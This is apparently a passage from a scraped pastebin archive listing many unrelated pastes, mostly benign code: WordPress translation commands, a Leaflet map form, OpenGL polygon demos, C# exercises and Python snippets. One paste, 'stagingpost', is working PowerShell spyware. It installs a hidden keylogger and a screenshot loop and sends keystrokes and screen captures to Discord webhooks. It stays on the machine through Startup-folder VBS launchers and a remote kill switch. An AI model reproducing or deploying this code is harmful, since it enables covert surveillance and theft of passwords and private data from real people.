wp i18n make-json wp-content/plugins/formidable-pro/languages/formidable-pro-fr_FR.po wp-content/plugins/formidable-pro/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-charts/languages/frm-charts-fr_FR.po wp-content/plugins/formidable-charts/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-googlespreadsheet/languages/formidable-google-sheets-fr_FR.po wp-content/plugins/formidable-googlespreadsheet/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-modal/languages/formidable-modal-fr_FR.po wp-content/plugins/formidable-modal/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-views/languages/formidable-views-fr_FR.po wp-content/plugins/formidable-views/languages/ --no-purge


# Italian
wp i18n make-json wp-content/languages/plugins/formidable-it_IT.po wp-content/languages/plugins/ --no-purge
wp i18n make-json wp-content/plugins/formidable-pro/languages/formidable-pro-it_IT.po wp-content/plugins/formidable-pro/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-charts/languages/frm-charts-it_IT.po wp-content/plugins/formidable-charts/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-googlespreadsheet/languages/formidable-google-sheets-it_IT.po wp-content/plugins/formidable-googlespreadsheet/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-modal/languages/formidable-modal-it_IT.po wp-content/plugins/formidable-modal/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-views/languages/formidable-views-it_IT.po wp-content/plugins/formidable-views/languages/ --no-purge


# Japanese
wp i18n make-json wp-content/languages/plugins/formidable-ja_JP.po wp-content/languages/plugins/ --no-purge
wp i18n make-json wp-content/plugins/formidable-pro/languages/formidable-pro-ja_JP.po wp-content/plugins/formidable-pro/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-charts/languages/frm-charts-ja_JP.po wp-content/plugins/formidable-charts/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-googlespreadsheet/languages/formidable-google-sheets-ja_JP.po wp-content/plugins/formidable-googlespreadsheet/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-modal/languages/formidable-modal-ja_JP.po wp-content/plugins/formidable-modal/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-views/languages/formidable-views-ja_JP.po wp-content/plugins/formidable-views/languages/ --no-purge


# Portuguese (BR)
wp i18n make-json wp-content/languages/plugins/formidable-pt_BR.po wp-content/languages/plugins/ --no-purge
wp i18n make-json wp-content/plugins/formidable-pro/languages/formidable-pro-pt_BR.po wp-content/plugins/formidable-pro/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-charts/languages/frm-charts-pt_BR.po wp-content/plugins/formidable-charts/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-googlespreadsheet/languages/formidable-google-sheets-pt_BR.po wp-content/plugins/formidable-googlespreadsheet/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-modal/languages/formidable-modal-pt_BR.po wp-content/plugins/formidable-modal/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-views/languages/formidable-views-pt_BR.po wp-content/plugins/formidable-views/languages/ --no-purge


# German
wp i18n make-json wp-content/languages/plugins/formidable-de_DE.po wp-content/languages/plugins/ --no-purge
wp i18n make-json wp-content/plugins/formidable-pro/languages/formidable-pro-de_DE.po wp-content/plugins/formidable-pro/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-charts/languages/frm-charts-de_DE.po wp-content/plugins/formidable-charts/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-googlespreadsheet/languages/formidable-google-sheets-de_DE.po wp-content/plugins/formidable-googlespreadsheet/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-modal/languages/formidable-modal-de_DE.po wp-content/plugins/formidable-modal/languages/ --no-purge
wp i18n make-json wp-content/plugins/formidable-views/languages/formidable-views-de_DE.po wp-content/plugins/formidable-views/languages/ --no-purge"
80MAYSZa,Leaflet with geocoder,hctorres02,HTML,Saturday 4th of May 2024 06:53:56 AM CDT,"<div class=""row"">
    <div class=""col-md-12"">
        <div class=""form-field-default"">
            <label>Localização:</label>
            <div id=""location-map"" style=""background:#fff;border:none;height:440px;width:100%;box-sizing:border-box""></div>
            <input type=""hidden"" name=""endereco_latlng"" value="""">
        </div>
        <div class=""clear""></div>
    </div>
</div>
<div class=""row"">
    <div class=""col-md-3"">
        <div class=""form-field-default"">
            <label>CEP</label>
            <input class=""maskcep"" type=""text"" name=""endereco_cep"" placeholder=""CEP"" value="""">
        </div>
    </div>
    <div class=""col-md-7 col-xs-9"">
        <div class=""form-field-default"">
            <label>Rua</label>
            <input type=""text"" name=""endereco_rua"" placeholder=""Rua"" value="""">
        </div>
    </div>
    <div class=""col-md-2 col-xs-3"">
        <div class=""form-field-default"">
            <label>Nº</label>
            <input type=""text"" name=""endereco_numero"" placeholder=""Nº"" value="""">
        </div>
    </div>
</div>
<div class=""row"">
    <div class=""col-md-12"">
        <div class=""form-field-default"">
            <label>Bairro</label>
            <input type=""text"" name=""endereco_bairro"" placeholder=""Bairro"" value="""">
        </div>
    </div>
</div>
<link rel=""stylesheet"" href=""https://unpkg.com/leaflet@1.0.3/dist/leaflet.css"" />
<link rel=""stylesheet"" href=""https://unpkg.com/esri-leaflet-geocoder@3.1.3/dist/esri-leaflet-geocoder.css"">
<script src=""https://unpkg.com/leaflet@1.0.3/dist/leaflet.js""></script>
<script src=""https://unpkg.com/esri-leaflet@3.0.8/dist/esri-leaflet.js""></script>
<script src=""https://unpkg.com/esri-leaflet-geocoder@3.1.3/dist/esri-leaflet-geocoder.js""></script>
<script>
    function showMap() {
      setTimeout(function() {
        const targetId = ""location-map"";
        const $map = $('#' + targetId);
        const $latlng = $(""[name='endereco_latlng']"");
        const $nome = $(""[name='nome']"");
        const latlng = JSON.parse($latlng.val());
        const origin = L.marker(latlng);
        const apikey = ""ARCGIS_API_KEY"";
        if ($map.data('already-mounted')) {
          return;
        }
        $map.attr('data-already-mounted', true)
        const map = L.map(targetId, {
          maxZoom: 16,
          minZoom: 12,
          zoomControl: false
        });
        const geocodeService = L.esri.Geocoding.geocodeService({
          apikey
        });
        const providers = [
          L.esri.Geocoding.arcgisOnlineProvider({
            apikey,
            countries: ['BRA'],
          })
        ];
        map.setView(origin.getLatLng(), 16).on(""click"", handleClick);
        origin.addTo(map);
        L.tileLayer(""https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"", {
          attribution: ""Map data &copy;  < a href = \""https://openstreetmap.org\"">OpenStreetMap < /a>"",
        }).addTo(map);
        L.control.zoom({
          position: 'bottomright'
        }).addTo(map);
        L.esri.Geocoding.geosearch({
          providers,
          expanded: true,
          useMapBounds: false,
          collapseAfterResult: false,
          placeholder: 'Pesquisar',
        }).addTo(map).on(""results"", handleClick);
    
        function handleClick(e) {
          geocodeService.reverse().latlng(e.latlng).run(function(error, result) {
            if (Boolean(error) == false) {
              $(""[name='endereco_cep']"").val(result.address.Postal).trigger(""change"");
            }
            map.setView(e.latlng, 16);
            origin.setLatLng(e.latlng);
            $latlng.val(JSON.stringify(Object.values(e.latlng)));
          });
        }
      }, 100);
    }
</script>
"
7cWEPDMf,Untitled,Niftl,C++,Saturday 4th of May 2024 06:27:21 AM CDT,"#include <GL/glut.h>
#include <stdlib.h>
#include <time.h>
#include <stdio.h>

int WINDOW_WIDTH = 800;
int WINDOW_HEIGHT = 600;
int numVertices = 5; // Initial number of vertices for the polygon
int pointX = 400;    // Initial x-coordinate of the point
int pointY = 300;    // Initial y-coordinate of the point
typedef struct {
    int x, y;
} Point;
Point *polygonVertices = NULL; // Dynamic array for storing polygon vertices

// Function to generate initial polygon vertices
void initPolygonVertices() {
    polygonVertices = realloc(polygonVertices, numVertices * sizeof(Point));
    for (int i = 0; i < numVertices; ++i) {
        polygonVertices[i].x = rand() % WINDOW_WIDTH;
        polygonVertices[i].y = rand() % WINDOW_HEIGHT;
    }
}

// Function to draw a polygon
void drawPolygon() {
    glColor3f(0.0, 0.5, 0.8); // Set color for the polygon (light blue)
    glBegin(GL_POLYGON);
    for (int i = 0; i < numVertices; ++i) {
        glVertex2f(polygonVertices[i].x, polygonVertices[i].y);
    }
    glEnd();
}

// Function to draw a point
void drawPoint() {
    glColor3f(1.0, 0.0, 0.0); // Set color for the point (red)
    glPointSize(5); // Set point size for better visibility
    glBegin(GL_POINTS);
    glVertex2f(pointX, pointY);
    glEnd();
}

// Check if point is inside polygon using ray-casting algorithm
int isPointInsidePolygon(int x, int y) {
    int inside = 0;
    int n = numVertices;
    for (int i = 0, j = n - 1; i < n; j = i++) {
        int intersect = ((polygonVertices[i].y > y) != (polygonVertices[j].y > y)) &&
                        (x < (polygonVertices[j].x - polygonVertices[i].x) * (y - polygonVertices[i].y) / (polygonVertices[j].y - polygonVertices[i].y) + polygonVertices[i].x);
        if (intersect) {
            inside = !inside;
        }
    }
    return inside;
}

// Function to handle window drawing
void display() {
    glClear(GL_COLOR_BUFFER_BIT);
    
    // Draw the polygon
    drawPolygon();
    
    // Draw the point
    drawPoint();

    // Check if point is inside polygon and print the result
    if (isPointInsidePolygon(pointX, pointY)) {
        printf(""The point is inside the polygon.\n"");
    } else {
        printf(""The point is outside the polygon.\n"");
    }
    
    glFlush();
}

// Function to handle window resizing
void reshape(int w, int h) {
    glViewport(0, 0, w, h);
    glMatrixMode(GL_PROJECTION);
    glLoadIdentity();
    gluOrtho2D(0, w, 0, h);
    glMatrixMode(GL_MODELVIEW);
    WINDOW_WIDTH = w;
    WINDOW_HEIGHT = h;
}

// Function to handle keyboard input
void keyboard(unsigned char key, int x, int y) {
    switch (key) {
        case '+':
            numVertices++;
            if (numVertices > 2) {
                initPolygonVertices(); // Regenerate polygon vertices
                glutPostRedisplay(); // Redraw window
            }
            break;
        case '-':
            if (numVertices > 3) {
                numVertices--;
                initPolygonVertices(); // Regenerate polygon vertices
                glutPostRedisplay(); // Redraw window
            }
            break;
        default:
            break;
    }
}

// Function to handle mouse input (move the point)
void mouse(int button, int state, int x, int y) {
    if (button == GLUT_LEFT_BUTTON && state == GLUT_DOWN) {
        pointX = x;
        pointY = WINDOW_HEIGHT - y; // Invert y-coordinate to match OpenGL convention
        glutPostRedisplay(); // Redraw window
    }
}

int main(int argc, char** argv) {
    srand(time(NULL)); // Seed random number generator
    initPolygonVertices(); // Initialize polygon vertices

    glutInit(&argc, argv);
    glutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);
    glutInitWindowSize(WINDOW_WIDTH, WINDOW_HEIGHT);
    glutCreateWindow(""Polygon and Point in C"");

    glutDisplayFunc(display);
    glutReshapeFunc(reshape);

    glutKeyboardFunc(keyboard);
    glutMouseFunc(mouse);

    glClearColor(1.0, 1.0, 1.0, 1.0); // Set background color to white

    glutMainLoop();

    return 0;
}
"
bUZPrU0N,Untitled,Niftl,C++,Saturday 4th of May 2024 06:21:05 AM CDT,"#include <GL/glut.h>
#include <stdlib.h>
#include <time.h>
#include <vector>

int WINDOW_WIDTH = 800;
int WINDOW_HEIGHT = 600;
int numVertices = 5; // Initial number of vertices for the polygon
int pointX = 400;    // Initial x-coordinate of the point
int pointY = 300;    // Initial y-coordinate of the point
std::vector<std::pair<int, int>> polygonVertices; // Store polygon vertices

// Function to generate initial polygon vertices
void initPolygonVertices() {
    polygonVertices.clear();
    for (int i = 0; i < numVertices; ++i) {
        polygonVertices.push_back({rand() % WINDOW_WIDTH, rand() % WINDOW_HEIGHT});
    }
}

// Function to draw a polygon
void drawPolygon() {
    glColor3f(0.0, 0.5, 0.8); // Set color for the polygon (light blue)
    glBegin(GL_POLYGON);
    for (auto &vertex : polygonVertices) {
        glVertex2f(vertex.first, vertex.second);
    }
    glEnd();
}

// Function to draw a point
void drawPoint() {
    glColor3f(1.0, 0.0, 0.0); // Set color for the point (red)
    glPointSize(5); // Set point size for better visibility
    glBegin(GL_POINTS);
    glVertex2f(pointX, pointY);
    glEnd();
}

// Function to handle window drawing
void display() {
    glClear(GL_COLOR_BUFFER_BIT);
    
    // Draw the polygon
    drawPolygon();
    
    // Draw the point
    drawPoint();
    
    glFlush();
}

// Function to handle window resizing
void reshape(int w, int h) {
    glViewport(0, 0, w, h);
    glMatrixMode(GL_PROJECTION);
    glLoadIdentity();
    gluOrtho2D(0, w, 0, h);
    glMatrixMode(GL_MODELVIEW);
    WINDOW_WIDTH = w;
    WINDOW_HEIGHT = h;
}

// Function to handle keyboard input
void keyboard(unsigned char key, int x, int y) {
    switch (key) {
        case '+':
            numVertices++;
            if (numVertices > 2) {
                initPolygonVertices(); // Regenerate polygon vertices
                glutPostRedisplay(); // Redraw window
            }
            break;
        case '-':
            if (numVertices > 3) { // Ensure at least 3 vertices
                numVertices--;
                initPolygonVertices(); // Regenerate polygon vertices
                glutPostRedisplay(); // Redraw window
            }
            break;
        default:
            break;
    }
}

// Function to handle mouse input (move the point)
void mouse(int button, int state, int x, int y) {
    if (button == GLUT_LEFT_BUTTON && state == GLUT_DOWN) {
        pointX = x;
        pointY = WINDOW_HEIGHT - y; // Invert y-coordinate to match OpenGL convention
        glutPostRedisplay(); // Redraw window
    }
}

int main(int argc, char** argv) {
    srand(time(NULL)); // Seed random number generator
    initPolygonVertices(); // Initialize polygon vertices

    glutInit(&argc, argv);
    glutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);
    glutInitWindowSize(WINDOW_WIDTH, WINDOW_HEIGHT);
    glutCreateWindow(""Polygon and Point"");
    
    glutDisplayFunc(display);
    glutReshapeFunc(reshape);
    
    glutKeyboardFunc(keyboard);
    glutMouseFunc(mouse);
    
    glClearColor(1.0, 1.0, 1.0, 1.0); // Set background color to white
    
    glutMainLoop();
    
    return 0;
}
"
xWGYxUW4,Untitled,_KAGATUN_,C#,Saturday 4th of May 2024 06:20:14 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;

namespace FindingPerpetrator
{
    internal class Program
    {
        static void Main(string[] args)
        {
            List<Criminal> criminals = new List<Criminal>
            {
                new Criminal (""Иванов"", ""Иван"", ""Иванович"", ""Армянин"", ""175"", ""70"", true),
                new Criminal (""Петров"", ""Николай"", ""Владимирович"", ""Украинец"", ""165"", ""73"", false),
                new Criminal (""Сергеев"", ""Илья"", ""Петрович"", ""Русский"", ""186"", ""90"", true),
                new Criminal (""Соколовский"", ""Иван"", ""Константинович"", ""Русский"", ""180"", ""94"", true),
                new Criminal (""Абрамов"", ""Александр"", ""Валентинович"", ""Русский"", ""177"", ""70"", true),
                new Criminal (""Воробьев"", ""Александр"", ""Сергеевич"", ""Украинец"", ""165"", ""65"", false),
                new Criminal (""Корешков"", ""Валерий"", ""Степанович"", ""Украинец"", ""171"", ""113"", true),
                new Criminal (""Чечеков"", ""Артем"", ""Александрович"", ""Русский"", ""198"", ""153"", true),
                new Criminal (""Крикунов"", ""Михаил"", ""Евгеньевич"", ""Русский"", ""180"", ""85"", true),
                new Criminal (""Зайцев"", ""Юрий"", ""Антонович"", ""Армянин"", ""176"", ""83"", true),
            };

            for (int i = 0; i < criminals.Count; i++)
            {
                criminals[i].ShowInfo();
            }

            SearchEngine searchEngine = new SearchEngine(criminals);
            searchEngine.SearchByParameter();
        }
    }

    class Criminal
    {
        public Criminal(string surname, string name, string patronymic, string nationality, string height, string weight, bool inCustody)
        {
            Surname = surname;
            Name = name;
            Patronymic = patronymic;
            Nationality = nationality;
            Height = height;
            Weight = weight;
            InCustody = inCustody;
        }

        public string Surname { get; private set; }
        public string Name { get; private set; }
        public string Patronymic { get; private set; }
        public string Nationality { get; private set; }
        public string Height { get; private set; }
        public string Weight { get; private set; }
        public bool InCustody { get; private set; }

        public void ShowInfo()
        {
            Console.WriteLine($""Фамилия: {Surname}, Имя: {Name}, Отчество: {Patronymic}, Национальность: {Nationality}, "" +
                $""Рост: {Height}см, Вес: {Weight}кг, Статус: {GetStatus()}"");
        }

        public string GetStatus()
        {
            return InCustody ? ""В заключении"" : ""На свободе"";
        }
    }

    class SearchEngine
    {
        private List<Criminal> _criminals;

        public SearchEngine(List<Criminal> criminal)
        {
            _criminals = criminal;
        }

        public void SearchByParameter()
        {
            Console.WriteLine(""\nВведите рост преступника"");
            string userInputHeight = Console.ReadLine();

            Console.WriteLine(""\nВведите вес преступника"");
            string userInputWeight = Console.ReadLine();

            Console.WriteLine(""\nВведите национальность преступника"");
            string userInputNationality = Console.ReadLine();

            var wantedCriminals = _criminals.Where(criminal => criminal.Height == userInputHeight
                                                  && criminal.Weight == userInputWeight
                                                  && criminal.Nationality.ToLower() == userInputNationality.ToLower()
                                                  && !criminal.InCustody).ToList();
            if (wantedCriminals.Any())
            {
                foreach (var criminal in wantedCriminals)
                {
                    Console.WriteLine(""\nНайден:\n"");
                    criminal.ShowInfo();
                }
            }
            else
            {
                Console.WriteLine(""Не найден преступник с требуемыми параметрами"");
            }
        }
    }
}
"
TbSRiqv2,data916,TestGuy1,JSON,Saturday 4th of May 2024 06:00:08 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '63593955b63489f867f85a1e944fbe5c429a6e8ac96ddfe57288661ef881264abbf84af064ef9552892e5b7490c95afc446f2b34e7cd4fbe46377d461d7e5c43e122b226c87315747531a46d55d5d413d284eb961dc6b265fe0aa11380ef3c808b4abe7e44fb624e4fef5df1550ec139bfbd0efce30af90baaee993f7b759b6f',
  otherdata: [
    'f148715c09f3435b523442ca0422d923',
    'a5baa033a05b013dd9c842263063ef01',
    '50bc0b0f8fc7b448329c3b83c300db28',
    '1b7bb9e21e9056a245230266c7ba05de',
    '0c0dd493888eeb5165123e976344e9ba',
    '22122c105ba423114b47554dd134c18f',
    '4e0db11f533eb63baf6bf1efa487c0af',
    'b6a5079da6ffea4683f3799d8585a45f'
  ]
}"
GNGebALF,shuffle random merge,homer512,Python,Saturday 4th of May 2024 05:55:50 AM CDT,"#!/usr/bin/env python3


import collections
import random


def merge_random(left, right):
    choices = [0] * len(left) + [1] * len(right)
    random.shuffle(choices)
    readpositions = [iter(left), iter(right)]
    return [next(readpositions[choice]) for choice in choices]


def make_shuffle():
    sequence = [1, 2, 3, 4]
    # Step 1: Directly shuffle blocks that fit into memory
    blocks = [sequence[:2], sequence[2:]]
    for block in blocks:
        random.shuffle(block)
    # Step 2: Pairwise shuffle blocks. For more blocks, repeat
    merged_block = merge_random(*blocks)
    return merged_block


def main():
    counter = collections.Counter(
            tuple(make_shuffle()) for _ in range(1_000_000))
    for value, key in sorted((value, key) for key, value in counter.items()):
        print(value, key)


if __name__ == '__main__':
    main()
"
UUHScwB9,modified_A,maxim_shlyahtin,C++,Saturday 4th of May 2024 05:36:34 AM CDT,"#include <iostream>
#include <vector>
#include <map>
#include <utility>
#include <string>
#include <limits>

// граф - ориентированный
struct Vertex {
    bool visited = false;
    int neighbors_num;
};

std::vector<char> greedy_alg(std::map<char, std::vector<std::pair<char, double>>>& graph, char start, char end) {
    std::vector<char> path = {start};
    std::map<char, Vertex> vertices;
    double inf = std::numeric_limits<double>::max();
    double minWeight = inf;
    char current = start;
    vertices[start].visited = true;
    vertices[start].neighbors_num = graph[current].size();
    while (current != end) {
        if (!vertices[current].visited) {
            vertices[current].neighbors_num = graph[current].size();
            vertices[current].visited = true;
        }
        if (vertices[current].neighbors_num == 0) {
            path.pop_back();
            current = path[path.size() - 1];
        }
        char next;
        for (const auto& vert : graph[current]) {
            if (graph[vert.first].size() == 0 && vert.first != end) {
                vertices[current].neighbors_num--;
                continue;
            }
            else if (graph[vert.first].size() == 0 && vert.first == end) {
                path.push_back(end);
                return path;
            }
            if (vert.second < minWeight && graph[vert.first].size() > 0) {
                minWeight = vert.second;
                next = vert.first;
            }
        }
        path.push_back(next);
        minWeight = inf;
        current = next;
        
    }
    return path;
}

int main() {
    std::map<char, std::vector<std::pair<char, double>>> graph;
    char start, end;
    std::cin >> start >> end;
    char from, to;
    double weight;

    while (std::cin >> from >> to >> weight) {
        graph[from].insert(graph[from].end(), { std::make_pair(to, weight) });
    }
    std::vector<char> res = greedy_alg(graph, start, end);
    for (const auto& it : res) {
        std::cout << it;
    }
    std::cout << '\n';
    return 0;
}
"
kaKAkYPd,stagingpost,beigeworm,PHP,Saturday 4th of May 2024 05:00:44 AM CDT,"# Assume the tokens have been retrieved and stored in these variables
$screenwebhooktoken = irm 'https://pastebin.com/raw/c8fg78KU'
$logwebhooktoken = irm 'https://pastebin.com/raw/STyjVHJR'
$killurl = 'https://pastebin.com/raw/aNPVXCZQ'

# Base URL for the Discord webhook
$webhookurl = 'https://discord.com/api/webhooks/'

# Construct the full webhook URLs by concatenating the base URL with the tokens
$screenwebhook = $webhookurl + $screenwebhooktoken
$logwebhook = $webhookurl + $logwebhooktoken


$scps1 = @'

$Path = ""$env:Temp\ffmpeg.exe""
If (!(Test-Path $Path)){  
$jsonsys = @{""username"" = ""$env:COMPUTERNAME"" ;""content"" = "":hourglass: ``Downloading ffmpeg.exe. Please wait...`` :hourglass:""} | ConvertTo-Json
Invoke-RestMethod -Uri $hurl -Method Post -ContentType ""application/json"" -Body $jsonsys
    $zipUrl = 'https://www.gyan.dev/ffmpeg/builds/packages/ffmpeg-7.0-essentials_build.zip'
    $tempDir = ""$env:temp""
    $zipFilePath = Join-Path $tempDir 'ffmpeg-7.0-essentials_build.zip'
    $extractedDir = Join-Path $tempDir 'ffmpeg-7.0-essentials_build'
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
    Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
    Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
    Remove-Item -Path $zipFilePath -Force
    Remove-Item -Path $extractedDir -Recurse -Force
}

$mkvPath = ""$env:Temp\ScreenClip.jpg""
if (Test-Path $mkvpath){
    rm -Path $mkvPath -Force
}

$jsonsys = @{""username"" = ""$env:COMPUTERNAME"" ;""content"" = "":arrows_counterclockwise: ``Taking Screenshots..`` :arrows_counterclockwise:""} | ConvertTo-Json
Invoke-RestMethod -Uri $hurl -Method Post -ContentType ""application/json"" -Body $jsonsys
while ($true){
    .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf ""fps=1"" $mkvPath
    sleep 2
    curl.exe -F file1=@""$mkvPath"" $hurl | Out-Null
    sleep 5
    rm -Path $mkvPath -Force
    $response = irm $killurl
    if ($response -like ""kill"") {
        rm -path ""$env:APPDATA\Microsoft\Windows\Themes\ffmpeg.ps1""
        $jsonsys = @{""username"" = ""$env:COMPUTERNAME"" ;""content"" = "":octagonal_sign: ``REMOVED`` :octagonal_sign:""} | ConvertTo-Json
        Invoke-RestMethod -Uri $hurl -Method Post -ContentType ""application/json"" -Body $jsonsys
        exit
    }
}
'@

""`$hurl = '$screenwebhook' ; `$killurl = '$killurl'"" | Out-File -FilePath ""$env:APPDATA\Microsoft\Windows\Themes\ffmpeg.ps1"" -Force
$scps1 | Out-File -FilePath ""$env:APPDATA\Microsoft\Windows\Themes\ffmpeg.ps1"" -Append -Force

$klps1 = @'

$API = @'
[DllImport(""user32.dll"", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport(""user32.dll"", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport(""user32.dll"", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport(""user32.dll"", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$klps2 = @'

$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)
While ($true){
  $keyPressed = $false
    try{
      while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
      Start-Sleep -Milliseconds 30
        for ($asc = 8; $asc -le 254; $asc++){
        $keyst = $API::GetAsyncKeyState($asc)
          if ($keyst -eq -32767) {
          $keyPressed = $true
          $LastKeypressTime.Restart()
          $null = [console]::CapsLock
          $vtkey = $API::MapVirtualKey($asc, 3)
          $kbst = New-Object Byte[] 256
          $checkkbst = $API::GetKeyboardState($kbst)
          $logchar = New-Object -TypeName System.Text.StringBuilder          
            if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
              $LString = $logchar.ToString()
                if ($asc -eq 8) {$LString = ""[BKSP]""}
                if ($asc -eq 13) {$LString = ""[ENT]""}
                if ($asc -eq 27) {$LString = ""[ESC]""}
            $send += $LString 
            }
          }
        }
        $response = irm $killurl
        if ($response -like ""kill"") {
            rm -path ""$env:APPDATA\Microsoft\Windows\Themes\update_check.ps1""
            $jsonsys = @{""username"" = ""$env:COMPUTERNAME"" ;""content"" = "":octagonal_sign: ``REMOVED`` :octagonal_sign:""} | ConvertTo-Json
            Invoke-RestMethod -Uri $dc -Method Post -ContentType ""application/json"" -Body $jsonsys
            exit
        }
      }
    }
    finally{
      If ($keyPressed) {
      $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
      $timestamp = Get-Date -Format ""dd-MM-yyyy HH:mm:ss""
      $escmsg = $timestamp+"" : ""+'`'+$escmsgsys+'`'
      $jsonsys = @{""username"" = ""$env:COMPUTERNAME"" ;""content"" = $escmsg} | ConvertTo-Json
      Invoke-RestMethod -Uri $dc -Method Post -ContentType ""application/json"" -Body $jsonsys
      $send = """"
      $keyPressed = $false
      }
    }
  $LastKeypressTime.Restart()
  Start-Sleep -Milliseconds 10
}

'@

""`$dc = '$logwebhook' ; `$killurl = '$killurl'"" | Out-File -FilePath ""$env:APPDATA\Microsoft\Windows\Themes\update_check.ps1"" -Force
$klps1 | Out-File -FilePath ""$env:APPDATA\Microsoft\Windows\Themes\update_check.ps1"" -Append -Force
""'@"" | Out-File -FilePath ""$env:APPDATA\Microsoft\Windows\Themes\update_check.ps1"" -Append -Force
$klps2 | Out-File -FilePath ""$env:APPDATA\Microsoft\Windows\Themes\update_check.ps1"" -Append -Force


$tobat = @'
Set objShell = CreateObject(""WScript.Shell"")
WScript.Sleep 500
objShell.Run ""powershell.exe -NoP -NonI -Exec Bypass -W Hidden -File """"%APPDATA%\Microsoft\Windows\Themes\ffmpeg.ps1"""""", 0, True
'@

$pth = ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs""
$tobat | Out-File -FilePath $pth -Force


$tobat2 = @'
Set objShell = CreateObject(""WScript.Shell"")
WScript.Sleep 500
objShell.Run ""powershell.exe -NoP -NonI -Exec Bypass -W Hidden -File """"%APPDATA%\Microsoft\Windows\Themes\update_check.ps1"""""", 0, True
'@

$pth2 = ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs""
$tobat2 | Out-File -FilePath $pth2 -Force


$jsonsys = @{""username"" = ""$env:COMPUTERNAME"" ;""content"" = "":white_check_mark: ``Persistance Installed!`` :white_check_mark:""} | ConvertTo-Json
Invoke-RestMethod -Uri $screenwebhook -Method Post -ContentType ""application/json"" -Body $jsonsys
sleep 1
& $pth
sleep 1 
& $pth2

pause"
vVMQ4ct0,Untitled,_KAGATUN_,C#,Saturday 4th of May 2024 04:56:25 AM CDT,"//У вас есть автосервис, в который приезжают люди, чтобы починить свои автомобили.
//У вашего автосервиса есть баланс денег и склад деталей.
//Когда приезжает автомобиль, у него сразу ясна его поломка, и эта поломка отображается у вас в консоли вместе с ценой за починку(цена за починку складывается из цены детали + цена за работу).
//Поломка всегда чинится заменой детали, но количество деталей ограничено тем, что находится на вашем складе деталей.
//Если у вас нет нужной детали на складе, то вы можете отказать клиенту, и в этом случае вам придется выплатить штраф.
//Если вы замените не ту деталь, то вам придется возместить ущерб клиенту.
//За каждую удачную починку вы получаете выплату за ремонт, которая указана в чек-листе починки.
//Класс Деталь не может содержать значение “количество”. Деталь всего одна, за количество отвечает тот, кто хранит детали.
//При необходимости можно создать дополнительный класс для конкретной детали и работе с количеством.

using System;
using System.Collections.Generic;

namespace CarService
{
    class Program
    {
        static void Main(string[] args)
        {
            DetailCreator detailCreator = new DetailCreator();

            CarCreator createCars = new CarCreator(detailCreator);

            Warehouse warehouse = new Warehouse(detailCreator);
            warehouse.FillDetails();

            CarService carService = new CarService(createCars.ReturnQueue(), warehouse);

            carService.Work();
        }
    }

    public class Utilities
    {
        private static Random s_random = new Random();

        public static int GetRandomNumber(int min, int max)
        {
            return s_random.Next(min, max + 1);
        }
    }

    class Car
    {
        private List<Detail> _details = new List<Detail>();

        public Car(List<Detail> details)
        {
            _details = details;
            MakeDefectiveDetails();
        }

        public bool HaveBrokenDetail()
        {
            for (int i = 0; i < _details.Count; i++)
            {
                if (_details[i].IsBroken == true)
                {
                    return true;
                }
            }

            return false;
        }

        public void ShowDetails()
        {
            Console.WriteLine(""Все детали автомобиля:\n"");

            if (_details.Count > 0)
            {
                for (int i = 0; i < _details.Count; i++)
                {
                    _details[i].ShowInfo();
                }
            }
        }

        public void ShowBrokenDetails()
        {
            bool isProperly = true;

            Console.WriteLine(""Неисправные детали автомобиля:\n"");

            for (int i = 0; i < _details.Count; i++)
            {
                if (_details[i].IsBroken == true)
                {
                    _details[i].ShowInfo();

                    isProperly = false;
                }
            }

            if (isProperly == true)
            {
                Console.WriteLine(""Все детали отремонтированны"");
            }
        }

        public bool TryGetDetail(string detailType, out Detail detail)
        {
            detail = null;

            foreach (Detail selectedDetail in _details)
            {
                if (detailType == selectedDetail.Type && selectedDetail.IsBroken == true)
                {
                    detail = selectedDetail;
                    return true;
                }
            }

            return false;
        }

        public List<Detail> ReturnDetails()
        {
            return new List<Detail>(_details);
        }

